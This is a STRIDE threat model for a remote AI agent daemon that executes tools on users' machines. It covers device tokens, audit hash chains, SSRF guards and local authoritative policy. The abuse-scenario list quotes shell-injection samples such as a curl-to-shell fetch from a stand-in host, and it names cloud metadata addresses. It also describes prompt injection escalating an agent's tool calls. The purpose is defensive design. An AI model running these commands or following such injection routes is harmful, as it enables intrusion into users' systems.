# Threat Model (STRIDE)

Scope: the remote-agent client (device daemon) and its communication with the
remoteagent.online cloud. The LLM providers (OpenAI, Anthropic, Google, DeepSeek,
OpenRouter) are third parties; their trust assumptions are stated explicitly.

## Assets

1. **Device control** — the ability to execute tools on the user's machine.
2. **Conversation content** — task text, reasoning, tool results, answers.
3. **Provider API keys** — stored encrypted on the cloud, used server-side.
4. **Device token** — the daemon's identity credential (on the device).
5. **Audit trail** — logs, traces, usage and cost data.

## Trust boundaries

- **Browser ↔ Cloud**: HTTPS, session auth + CSRF tokens.
- **Device ↔ Cloud**: HTTPS, Bearer device token; device initiates.
- **Cloud ↔ LLM provider**: HTTPS, per-user provider keys, decrypted only
  server-side at call time.

## STRIDE analysis

| Threat | Example | Mitigation |
|---|---|---|
| **Spoofing** | Attacker impersonates the device or the user | Device tokens are CSPRNG-generated and revocable; session auth with CSRF on writes; TLS certificate verification |
| **Tampering** | Intercept/modify task or results in transit; tamper with the local audit log | TLS 1.2+ everywhere; no plaintext fallback; integrity via Git-tagged releases; the local audit log is **hash-chained and append-only** — any edit breaks the chain and is detected by `remote-agent audit verify` |
| **Repudiation** | "The agent deleted the file, not me" | Complete audit trail per run: reasoning steps, tool calls with arguments, results, tokens, cost, latency — plus the device-side hash-chained policy-decision log |
| **Information disclosure** | Key leak from device, logs, or backup; SSRF exfiltrating cloud metadata | Provider keys never sent to devices; AES-256-GCM at rest; secrets excluded from logs and scrubbed from child process environments; **SSRF guard** — DNS resolved by the agent, every address CIDR-checked, cloud metadata endpoints blocked by name and IP, redirects re-validated per hop |
| **Denial of service** | Flood the cloud or the device | Per-user rate limits; plan-based limits; task expiry; step budgets; bounded tool output; **local per-tool rate limits** the control plane cannot override |
| **Elevation of privilege** | Prompt injection escalates a tool call; a malicious control plane widens its own powers | **Local policy is authoritative** — loaded from disk at startup, the cloud can never widen it (allow/deny/confirm per tool, presets). Shell executes argv arrays with a realpath-resolved allowlist (chains and pipes re-check every segment — pipe-to-shell is structurally impossible); files are workspace-confined with symlink/TOCTOU guards; deletes go to trash |

## Residual risks (accepted)

- **The cloud brain is an LLM**: a sufficiently creative prompt may produce an
  undesirable *allowed* action. Mitigated by allowlists, explicit background
  mode for long-running programs, and human-visible traces — but not
  eliminated. For high-stakes devices, restrict the tool set and keep a human
  in the loop.
- **Third-party providers**: conversation content is sent to the chosen LLM
  provider under the operator's own provider account terms.
- **Physical device access**: an attacker with OS-level access to the device
  can read the device token; revoke tokens immediately after device loss.

## Abuse scenarios reviewed

1. Malicious user sends a task that attempts shell command injection
   (`df; curl evil.sh|sh`, `curl x | sh`, `$(...)`, backticks, redirects) →
   structurally impossible: argv execution + per-segment allowlist.
2. Brain returns malformed JSON repeatedly → corrective nudges, then a safe
   final answer (no raw JSON leaks to the user).
3. Device goes offline mid-task → task expires with a closing message; no
   silent replay.
4. Stolen device token → server-side revocation kills the device connection.
5. Task tries to fetch cloud metadata (169.254.169.254, metadata.google.internal)
   or private ranges, incl. via DNS rebinding or a redirect → SSRF guard
   resolves DNS itself, checks every address, re-validates every redirect hop.
6. A compromised/malicious control plane asks the device to widen its own
   access → rejected: policy is local and authoritative, loaded from disk;
   the cloud can only request within it. Every denial is audited locally.
7. Audit log tampering → hash chain breaks; `remote-agent audit verify` reports
   the exact entry.
8. Symlink/FIFO tricks in the workspace → realpath containment, `O_NOFOLLOW`
   descriptor checks and special-file refusal.
